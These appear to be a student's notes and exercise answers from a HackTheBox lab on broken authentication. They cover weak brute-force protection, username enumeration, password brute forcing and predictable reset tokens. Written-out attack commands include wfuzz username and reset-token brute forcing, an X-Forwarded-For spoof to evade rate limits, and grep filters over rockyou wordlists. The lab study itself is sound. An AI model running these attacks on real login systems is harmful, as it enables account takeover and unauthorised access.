Solution 1: Check page title:
https://www.192-168-0-1login.org/router/advantech/advantech-webaccess-browser-based-hmi-and-scada-software/10330/


Weak Bruteforce Protection -----------
CAPTCHA
Rate Limits

Rate-limiting.py , The relevant lines are 10 and 13, where we configure a wait time and a lock message, and line 41, where we do the actual check.

Insufficient Protections:
For example, changing the User-Agent header is easy. Some web applications or web application firewalls leverage headers like X-Forwarded-For to guess the actual source IP address. This is done because many internet providers, mobile carriers, or big corporations usually “hide” users behind NAT. Blocking an IP address without the help of a header like X-Forwarded-For may result in blocking all users behind the specific NAT.
Solution:
40
X-Forwarded-For: 127.0.0.1
basic_bruteforce.py 

Brute Forcing Usernames------------
wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://example.com/login.php  -mr "username already exists"
Solutions:
/question 1,2 - Burp, Intruder - /usr/share/seclists/Usernames/top-usernames-shortlist.txt
/question 3 - python3 timing.py /usr/share/seclists/Usernames/top-usernames-shortlist.txt ; check the longest one
/question 4 - Send the POST request to intruder via burpsuite and fuzz for the parameters. you will get one of the username already registered.

Brute Forcing Passwords ------------
https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
Credential stuffing -  it is a known fact that many users reuse the same password on multiple services.
[/htb]$ grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep -E '^.{8,12}$' | wc -l
Try with simple: sa, sa1, sas1, Sas1 itd and try to see how many letters, Upper, Lower, Numbers are included...

 Solution:
 Probao u Registered User, sa,sasa,Sa1,
 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt
 grep '[[:upper:]]' rockyou-50.txt | grep '[[:digit:]]' | grep -E '^.{2,13}$' | wc -l

Predictable Reset Token---------------
reset_token_time.py 
wfuzz -z range,00000-99999 --ss "Valid" "https://example.com/token.php?user=admin&token=FUZZ"
